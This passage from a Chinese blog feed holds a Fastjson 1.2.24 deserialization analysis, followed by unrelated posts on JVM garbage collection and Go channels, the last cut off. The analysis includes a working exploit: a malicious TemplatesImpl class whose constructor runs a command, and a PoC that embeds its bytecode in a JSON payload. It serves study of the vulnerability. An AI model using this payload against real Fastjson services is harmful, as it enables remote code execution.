import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class evilClass1 extends AbstractTranslet/*ka1n4t*/ {


    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }


    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public evilClass1() throws IOException {
        Runtime.getRuntime().exec(&quot;calc&quot;);
    }

    public static void main(String[] args) throws IOException {
        evilClass1 helloworld = new evilClass1();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package ka1n4t.poc;

import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class vulApp1 {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }

        String result = Base64.encodeBase64String(bos.toByteArray());

        return result;
    }

    public static void bad_method() {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty(&quot;file.separator&quot;);
        String evil_path = &quot;D:\\Java-App\\fastjson-1.2.22\\target\\classes\\ka1n4t\\poc\\evilClass1.class&quot;;
        String evil_code = readClass(evil_path);

        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;

        String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
                &quot;'_name':'a.b',&quot; +
                &quot;'_tfactory':{ },&quot; +
                &quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    }

    public static void main(String args[]) {
        bad_method();
    }

}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;核心部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
                &quot;'_name':'a.b',&quot; +
                &quot;'_tfactory':{ },&quot; +
                &quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;

Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;_bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。&lt;/p&gt;
&lt;h3 id=&quot;调试分析&quot;&gt;调试分析&lt;/h3&gt;
&lt;p&gt;下面来分析一下反序列化TemplatesImpl的调用链，首先调用其getOutputProperties()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231343265-1253086974.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后下面经过java的反射机制，然后到达TemplatesImpl类：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231348265-283556941.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231351947-239433345.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231357850-1838602332.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;先跟进一下defineTransletClasses方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231402287-1895212372.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231405560-1672267489.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到TransletClassLoader继承了Java类加载器—ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。&lt;/p&gt;
&lt;p&gt;回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231411844-852683963.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231419145-2051768397.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x02-复现过程&quot;&gt;0x02 复现过程&lt;/h2&gt;
&lt;p&gt;从github上直接pull下poc：https://github.com/shengqi158/fastjson-remote-code-execute-poc。使用idea打开工程，编译test.java：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231608509-1666131704.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231612546-1146123517.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置运行方式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231615673-1622918376.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231619219-1450843927.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行Poc：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231633665-1784594823.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231636589-180318193.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x03-参考文章&quot;&gt;0x03 参考文章&lt;/h2&gt;
&lt;blockquote readability=&quot;0.27272727272727&quot;&gt;
&lt;p&gt;1.&lt;a href=&quot;http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&quot;&gt;廖新喜 fastjson 远程反序列化poc的构造和分析&lt;/a&gt;&lt;br/&gt;2.&lt;a href=&quot;https://www.freebuf.com/vuls/178012.html&quot;&gt;Freebuf Fastjson 1.2.24反序列化漏洞分析&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 19 Nov 2018 15:05:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>最近在学习Java安全，感觉反序列化很牛皮，所以就来学习一哈。我Java水平不咋地，文章如果有错请指正。 开始 0x00 简单介绍 介绍：FastJson是一款由阿里开发的JSON库 影响版本：1.2</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/litlife/p/9986427.html</dc:identifier>
</item>
<item>
<title>一篇文章让你了解GC垃圾回收器 - 彳亍风</title>
<link>http://www.cnblogs.com/lmqblogs/p/9986403.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lmqblogs/p/9986403.html</guid>
<description>&lt;p class=&quot;15&quot;&gt;&lt;span&gt;了解GC之前我们首先要了解GC是要做什么的？顾名思义回收垃圾，什么是垃圾呢？&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;GC回收的垃圾主要指的是回收堆内存中的垃圾对象。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;从根对象出发，所有被引用的对象，都是存活对象&lt;/span&gt;&lt;span&gt; 其他对象，都是垃圾对象。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;15&quot;&gt;&lt;span&gt; 根对象：&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 栈中的引用变量，所引用的对象。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　方法区经静态变量所引用的对象。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt; GC回收的三种基本方式&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;一、&lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;清除&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　标记存活对象，清理其他垃圾对象（阴影为存活对象，空白为垃圾对象）&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：效率高&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　缺点：产生碎片，使内存分布碎片化，造成内存空间不连续。若出现大的对象，内存空间不连续则难以存取&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222217837-896370043.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;二、&lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;整理&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　标记存活对象，清除垃圾对象，对垃圾对象进行整理 &lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：没有碎片&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 缺点：效率低&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222436798-1266001029.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;三、复制&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;　&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;　在内存中分配两块内存，将标记的存活对象复制到另一块内存当中，&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　再将原内存的对象清除。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：效率高&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　缺点：浪费内存&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222526767-1950256952.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;15&quot;&gt;&lt;span&gt; 内存分区&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　新生代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　老年代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　永久代（方法区）（在Java8中，永久代已经被移除，被一个称为“元数据区”（元空间）的区域所取代）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;15&quot;&gt;&lt;span&gt;新生代&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　主要是用来存放新生的对象。一般占据堆的1/3空间。由于频繁创建对象，所以新生代会频繁触发MinorGC进行垃圾回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 新生代又分为伊甸园与生存区，生存区分为ServivorFrom、ServivorTo&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Eden区（伊甸园）：Java新对象的出生地（如果新创建的对象占用内存很大，则直接分配到老年代）。当Eden区内存不够的时候就会触发MinorGC，对新生代区进行一次垃圾回收。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ServivorTo：保留了一次MinorGC过程中的幸存者。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ServivorFrom：上一次GC的幸存者，作为这一次GC的被扫描者。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;过程：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 新建对象，在伊甸园分配内存&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;span&gt;伊甸园存满，复制到&lt;/span&gt;from&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; from&lt;span&gt;存满，复制到&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;o，并交换角色&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;span&gt;对象在&lt;/span&gt;from&lt;span&gt;，&lt;/span&gt;to&lt;span&gt;之间复制&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;5次，晋升到老年代&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119223519416-1959605257.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;老年代&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 &lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;清除、标记&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;整理&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　间隔一段时间，会执行一次小范围垃圾回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　&lt;span&gt;当老年代空间占用到一定比例&lt;/span&gt; 0.85&lt;span&gt;，会执行&lt;/span&gt;full-gc&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 当老年代也满了装不下的时候，就会抛出OOM（Out of Memory）异常。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;常见的垃圾回收器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;串行垃圾回收器（Serial Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;并行垃圾回收器（Parallel Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;并发标记扫描垃圾回收器（CMS Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;G1垃圾回收器（G1 Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span&gt;了解主要的两种（CMS，G1）&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;CMS - &lt;span&gt;并发的标记&lt;/span&gt;-&lt;span&gt;清除&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;　　&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;STW(Stop The World)时间非常短暂&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　初始标记&lt;/span&gt;(stw)&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　只标记根对象&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　并发标记&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　垃圾回收器，与其他&lt;/span&gt;java程序并行执行&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　重新标记&lt;/span&gt;(stw)&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　并发清除&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　与其他&lt;/span&gt;java程序并行执行，&lt;/span&gt;&lt;span&gt;配置参数过多，使用过于复杂&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;总结：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　&lt;/span&gt;&lt;span&gt;是一种以获得最短回收停顿时间为目标的收集器，基于标记清除算法。&lt;/span&gt;&lt;span&gt;过程如下：初始标记，并发标记，重新标记，并发清除，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点是并发收集，低停顿，缺点是对CPU资源非常敏感，无法处理浮动垃圾，收集结束会产生大量空间碎片。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;G1 - Garbage First&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　内存被划分成几千个内存块&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 有伊甸园、生存区、老年代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 用复制算法&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 G1会找到垃圾最多的内存块，优先回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　&lt;span&gt;配置参数非常简单，只需要配置目标停顿时间&lt;/span&gt;(stw)&lt;span&gt;，&lt;/span&gt;G1自动调整其他参数，来达到预期的停顿时间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;总结：G1垃圾回收器适用于堆内存很大的情况，他将堆内存分割成不同的区域，并且并发的对其进行垃圾回收。&lt;/span&gt;&lt;span&gt;G1也可以在回收内存之后对剩余的&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　　堆内存空间进行压缩。&lt;/span&gt;&lt;span&gt;并发扫描标记垃圾回收器在STW情况下压缩内存。G1垃圾回收会优先选择第一块垃圾最多的区域&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 15:01:00 +0000</pubDate>
<dc:creator>彳亍风</dc:creator>
<og:description>简单了解GC垃圾回收器 了解GC之前我们首先要了解GC是要做什么的？顾名思义回收垃圾，什么是垃圾呢？ GC回收的垃圾主要指的是回收堆内存中的垃圾对象。 从根对象出发，所有被引用的对象，都是存活对象</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lmqblogs/p/9986403.html</dc:identifier>
</item>
<item>
<title>Go基础系列：channel入门 - 骏马金龙</title>
<link>http://www.cnblogs.com/f-ck-need-u/p/9986335.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/f-ck-need-u/p/9986335.html</guid>
<description>&lt;h2 id=&quot;channel基础&quot;&gt;channel基础&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;channel用于goroutines之间的通信，让它们之间可以进行数据交换。像管道一样，一个goroutine_A向channel_A中放数据，另一个goroutine_B从channel_A取数据&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;channel是指针类型的数据类型，通过make来分配内存。例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ch := make(chan int)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这表示创建一个channel，这个channel中只能保存int类型的数据。也就是说一端只能向此channel中放进int类型的值，另一端只能从此channel中读出int类型的值。&lt;/p&gt;
&lt;p&gt;需要注意，&lt;code&gt;chan TYPE&lt;/code&gt;才表示channel的类型。所以其作为参数或返回值时，需指定为&lt;code&gt;xxx chan int&lt;/code&gt;类似的格式。&lt;/p&gt;
&lt;p&gt;向ch这个channel放数据的操作形式为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ch &amp;lt;- VALUE&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从ch这个channel读数据的操作形式为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;-ch             // 从ch中读取一个值
val = &amp;lt;-ch
val := &amp;lt;-ch      // 从ch中读取一个值并保存到val变量中
val,ok = &amp;lt;-ch    // 从ch读取一个值，判断是否读取成功，如果成功则保存到val变量中&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实很简单，当ch出现在&lt;code&gt;&amp;lt;-&lt;/code&gt;的左边表示send，当ch出现在&lt;code&gt;&amp;lt;-&lt;/code&gt;的右边表示recv。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func main() {
    ch := make(chan string)
    go sender(ch)         // sender goroutine
    go recver(ch)         // recver goroutine
    time.Sleep(1e9)
}

func sender(ch chan string) {
    ch &amp;lt;- &quot;malongshuai&quot;
    ch &amp;lt;- &quot;gaoxiaofang&quot;
    ch &amp;lt;- &quot;wugui&quot;
    ch &amp;lt;- &quot;tuner&quot;
}

func recver(ch chan string) {
    var recv string
    for {
        recv = &amp;lt;-ch
        fmt.Println(recv)
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;malongshuai
gaoxiaofang
wugui
tuner&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面激活了一个goroutine用于执行sender()函数，该函数每次向channel ch中发送一个字符串。同时还激活了另一个goroutine用于执行recver()函数，该函数每次从channel ch中读取一个字符串。&lt;/p&gt;
&lt;p&gt;注意上面的&lt;code&gt;recv = &amp;lt;-ch&lt;/code&gt;，当channel中没有数据可读时，recver goroutine将会阻塞在此行。由于recver中读取channel的操作放在了无限for循环中，表示recver goroutine将一直阻塞，直到从channel ch中读取到数据，读取到数据后进入下一轮循环由被阻塞在&lt;code&gt;recv = &amp;lt;-ch&lt;/code&gt;上。直到main中的time.Sleep()指定的时间到了，main程序终止，所有的goroutine将全部被强制终止。&lt;/p&gt;
&lt;p&gt;因为receiver要不断从channel中读取可能存在的数据，所以&lt;strong&gt;receiver一般都使用一个无限循环来读取channel&lt;/strong&gt;，避免sender发送的数据被丢弃。&lt;/p&gt;

&lt;h2 id=&quot;channel的属性和分类&quot;&gt;channel的属性和分类&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;每个channel都有3种操作：send、receive和close&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;send：表示sender端的goroutine向channel中投放数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receive：表示receiver端的goroutine从channel中读取数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;close：表示关闭channel
&lt;ul&gt;&lt;li&gt;关闭channel后，send操作将导致painc&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关闭channel后，recv操作将返回对应类型的0值以及一个状态码false&lt;/strong&gt;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;close并非强制需要使用close(ch)来关闭channel，在某些时候可以自动被关闭&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果使用close()，建议条件允许的情况下加上defer&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;只在sender端上显式使用close()关闭channel。因为关闭通道意味着没有数据再需要发送&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;例如，判断channel是否被关闭：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;val, ok := &amp;lt;-counter
if ok {
    fmt.Println(val)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;channel分为两种：unbuffered channel和buffered channel&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;unbuffered channel：阻塞、同步模式
&lt;ul&gt;&lt;li&gt;sender端向channel中send一个数据，然后阻塞，直到receiver端将此数据receive&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receiver端一直阻塞，直到sender端向channel发送了一个数据&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;buffered channel：非阻塞、异步模式
&lt;ul&gt;&lt;li&gt;sender端可以向channel中send多个数据(只要channel容量未满)，容量满之前不会阻塞&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receiver端按照队列的方式(FIFO,先进先出)从buffered channel中按序receive其中数据&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;buffered channel有两个属性：容量和长度&lt;/strong&gt;：和slice的capacity和length的概念是一样的&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;capacity：表示bufffered channel最多可以缓冲多少个数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;length：表示buffered channel当前已缓冲多少个数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;创建buffered channel的方式为&lt;code&gt;make(chan TYPE,CAP)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;unbuffered channel可以认为是容量为0的buffered channel，所以每发送一个数据就被阻塞。注意，不是容量为1的buffered channel，因为容量为1的channel，是在channel中已有一个数据，并发送第二个数据的时候才被阻塞。&lt;/p&gt;
&lt;p&gt;换句话说，send被阻塞的时候，其实是没有发送成功的，只有被另一端读走一个数据之后才算是send成功。对于unbuffered channel来说，这是send/recv的同步模式。&lt;/p&gt;
&lt;p&gt;实际上，当向一个channel进行send的时候，先关闭了channel，再读取channel时会发现错误在send，而不是recv。它会提示向已经关闭了的channel发送数据。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func main() {
    counter := make(chan int)
    go func() {
        counter &amp;lt;- 32
    }()
    close(counter)
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出报错：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;panic: send on closed channel&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;所以，在Go的内部行为中，send和recv是一个整体行为，数据未读就表示未send成功&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;死锁deadlock&quot;&gt;死锁(deadlock)&lt;/h2&gt;
&lt;p&gt;当channel的某一端(sender/receiver)期待另一端的(receiver/sender)操作，另一端正好在期待本端的操作时，也就是说两端都因为对方而使得自己当前处于阻塞状态，这时将会出现死锁问题。&lt;/p&gt;
